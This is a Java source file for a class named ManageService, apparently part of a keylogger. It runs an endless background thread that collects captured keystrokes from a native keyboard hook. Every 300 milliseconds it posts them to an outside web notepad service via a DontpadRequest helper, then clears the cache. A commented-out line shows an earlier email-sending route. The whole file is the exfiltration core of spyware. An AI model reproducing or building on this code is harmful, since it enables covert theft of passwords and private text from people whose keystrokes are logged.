package handlers;

import keys.NativeKeyboard;

public class ManageService implements Runnable{
	private NativeKeyboard keyboard;
	private Thread service;
	
	public ManageService() {
		keyboard = new NativeKeyboard();
		service = new Thread(this, "Manage Service");
		service.start();
	}
	
	public NativeKeyboard getKeyboard() {
		return keyboard;
	}

	@Override
	public void run() {
		long start = System.nanoTime();
		while(true) {
			
			long elapsed = (System.nanoTime() - start) / 1_000_000;
			if(elapsed > 300) {
			//	Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
			  System.out.println(Utils.prettyPrint(keyboard.getKeyCache()));
				try {
					DontpadRequest.sendPost(Utils.prettyPrint(keyboard.getKeyCache()));
					keyboard.onSend();
				} catch (Exception e) {
					e.printStackTrace();
				}
				
				start = System.nanoTime();
			}
		}
	}
}
